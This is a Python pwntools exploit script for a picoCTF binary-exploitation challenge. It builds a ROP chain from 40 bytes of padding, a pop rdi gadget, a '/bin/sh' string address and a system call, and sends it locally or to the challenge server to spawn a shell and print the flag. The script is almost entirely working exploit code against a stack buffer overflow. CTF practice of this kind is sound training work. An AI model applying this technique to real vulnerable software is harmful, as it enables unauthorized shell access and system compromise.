from pwn import *
import sys

is_debug = False
gdbscript = f'''
    init-pwndbg
    b *pwnme+72
    r < payload.txt
    '''.format(**locals())

def dealing_with_arguments():
    '''
    Determine local vs remote execution
    '''

    if len(sys.argv) > 1:
        if sys.argv[1].lower() == "remote":
            return remote('saturn.picoctf.net', 54100)

        elif sys.argv[1].lower() == "gdb":
            return gdb.debug([program], gdbscript=gdbscript)
            # io = elf.process()
            # is_debug = True
        elif sys.argv[1].lower() == "local":
            return elf.process()
        else:
            print("usage of this script: script.py remote/gdb/local executable_program")
            exit()
    else:
        print("usage of this script: script.py remote/gdb/local executable_program")
        exit()

# Set up pwntools for the correct architecture
program = f'./{sys.argv[2]}'
elf = context.binary = ELF(program,checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = dealing_with_arguments()


padding = 40 # from testing in gdb
pop_rdi = 0x4007c3  # from ropper
bin_sh = 0x00601060  # from rabin2
system = 0x40074b # from gdb - disassmble useFulFunction

my_rop = ROP(elf)
my_rop.raw('A' * padding)
my_rop.raw(pop_rdi)
my_rop.raw(bin_sh)
my_rop.raw(system) 

print("my payload:")
print(my_rop.dump())

# Another method:
# payload = flat(
#     asm('nop') * padding,
#     pop_rdi,
#     bin_sh,
#     system
# )

# Save the payload to file
# write('payload.txt', payload)

# Send the payload
# io.sendlineafter(b'>', payload)
io.sendlineafter(b'>', my_rop.chain())

# Receive the flag
print(io.recvall().decode())